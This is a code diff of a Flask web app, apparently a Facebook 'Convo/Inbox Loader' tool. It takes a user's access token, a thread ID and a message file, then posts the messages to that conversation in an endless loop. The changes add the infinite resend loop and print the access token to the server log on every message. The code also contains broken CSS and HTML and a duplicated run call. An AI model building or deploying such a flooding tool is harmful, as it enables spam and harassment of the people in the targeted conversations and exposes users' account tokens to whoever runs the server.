@@ -1,7 +1,9 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request
 import requests
 import os
-
+from time import sleep
+import time
+from datetime import datetime
 app = Flask(__name__)
 app.debug = True
 
@@ -18,33 +20,35 @@ headers = {
 
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
-    status_message = None
-
     if request.method == 'POST':
-        try:
-            access_token = request.form.get('accessToken')
-            thread_id = request.form.get('threadId')
-            mn = request.form.get('kidx')
-            time_interval = int(request.form.get('time'))
-            txt_file = request.files['txtFile']
-            messages = txt_file.read().decode().splitlines()
+        access_token = request.form.get('accessToken')
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
 
-            for message1 in messages:
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = str(mn) + ' ' + message1
-                parameters = {'access_token': access_token, 'message': message}
-                response = requests.post(api_url, data=parameters, headers=headers)
-                if response.status_code == 200:
-                    print(f"Message sent: {message}")
-                else:
-                    raise ValueError("Invalid Information Provided")
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
 
-            status_message = "Server Running Done ✅"
-        except Exception as e:
-            print(f"Error: {e}")
-            status_message = "Your Info Error ❌"
+        while True:
+            try:
+                for message1 in messages:
+                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                    message = str(mn) + ' ' + message1
+                    parameters = {'access_token': access_token, 'message': message}
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        print(f"Message sent using token {access_token}: {message}")
+                    else:
+                        print(f"Failed to send message using token {access_token}: {message}")
+                    time.sleep(time_interval)
+            except Exception as e:
+                print(f"Error while sending message using token {access_token}: {message}")
+                print(e)
+                time.sleep(30)
 
-    return render_template_string('''
+
+    return '''
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -53,51 +57,38 @@ def send_message():
   <title>Amir Here❤️</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
-    body {
-      background: url('https://i.imgur.com/fTFrcCf.jpeg') no-repeat center center fixed;
-      background-size: cover;
-      color: white;
+    body{
+      background-color: red;
     }
-    .container {
-      max-width: 350px;
-      background-color: rgba(0, 0, 0, 0.7);
+    .container{
+      max-width: 300px;
+      background-color: bisque;
       border-radius: 10px;
       padding: 20px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+      box-shadow: 0 0 10px rgba(red, green, blue, alpha);
       margin: 0 auto;
       margin-top: 20px;
     }
-    .header {
+    .header{
       text-align: center;
       padding-bottom: 10px;
     }
-    .btn-submit, .btn-whatsapp, .btn-info {
+    .btn-submit{
       width: 100%;
       margin-top: 10px;
     }
-    .btn-info {
-      background-color: #17a2b8;
-      border: none;
-    }
-    .btn-info:hover {
-      background-color: #138496;
-    }
-    .footer {
+    .footer{
       text-align: center;
       margin-top: 10px;
-      color: white;
-    }
-    .status-message {
-      text-align: center;
-      font-weight: bold;
-      margin-top: 15px;
+      color: blue;
     }
   </style>
 </head>
 <body>
   <header class="header mt-4">
-    <h1 class="mb-3">𝙾𝙵𝙵𝙻𝙸𝙽𝙴 𝚂𝙴𝚁𝚅𝙴𝚁</h1>
-    <h2>Made by Mian Amir🤍</h2>
+    <h1 class="mb-3"> 𝙾𝙵𝙵𝙻𝙸𝙽𝙴 𝚂𝙴𝚁𝚅𝙴𝚁
+                                     MADE BY Mian Amir🤍
+    <h1 class="mt-3">🅾🆆🅽🅴🆁]|I{•------» Mian Amir ON FIRE ❤️  </h1>
   </header>
 
   <div class="container">
@@ -124,25 +115,18 @@ def send_message():
       </div>
       <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
     </form>
-    <a href="https://wa.me/923114397148" target="_blank">
-      <button class="btn btn-success btn-whatsapp">Contact Me on WhatsApp</button>
-    </a>
-    <a href="https://www.youtube.com/your-video-link" target="_blank">
-      <button class="btn btn-info btn-info">How To Use video</button>
-    </a>
-    {% if status_message %}
-      <div class="status-message">{{ status_message }}</div>
-    {% endif %}
   </div>
   <footer class="footer">
     <p>&copy; Developed by Mian Amir 2024. All Rights Reserved.</p>
-    <p>Convo/Group Loader Tool</p>
+    <p>Convo/Inbox Loader Tool</p>
+    <p>Keep enjoying  <a href="https://github.com/zeeshanqureshi0</a></p>
   </footer>
 </body>
-</html>
-    ''', status_message=status_message)
+  </html>
+    '''
 
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
+    app.run(debug=True)
